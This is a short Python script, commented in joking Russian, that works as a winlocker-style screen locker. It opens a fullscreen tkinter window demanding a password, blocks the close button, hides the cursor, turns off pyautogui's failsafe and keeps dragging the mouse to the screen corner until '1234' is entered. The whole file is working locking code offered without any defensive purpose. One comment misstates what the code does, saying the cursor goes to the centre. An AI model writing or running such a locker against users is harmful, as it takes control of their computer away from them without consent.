from tkinter import Tk, Entry, Label # Импортируем нужную фигню)
import pyautogui, sys
 
 
root = Tk()

root.config(bg="#2F4F4F") #Меняем цвет фона

label = Label(root, text='tuz69', font='Courier 14') # Авторское право XD
label.place(relx=.5, rely=.94, anchor="center") #Настройка надписи АП
 
label = Label(root, text='Введите пароль!', font='Courier 30') #НАстройка главной надписи!
label.place(relx=.5, rely=.4, anchor="center") #Настройка главной надписи!XD
 
entry = Entry(root, font='Courier 16') #Строка ввода
entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40) # НАстройка строки ввода
entry.focus()
 
root.protocol('WM_DELETE_WINDOW', lambda: None) #Настройка окна (Удаляем верхнюю панель!)
root.attributes('-fullscreen', True) # Делаем полно экранный режим!
root.config(cursor="none") # Убираем курсор ёпт)
pyautogui.FAILSAFE = False
 
while True:
    pyautogui.moveTo(0, 0) #Ставим курсор по центру
    root.update()
    if entry.get() == '1234': #Код для взлома NASA :)
        sys.exit()
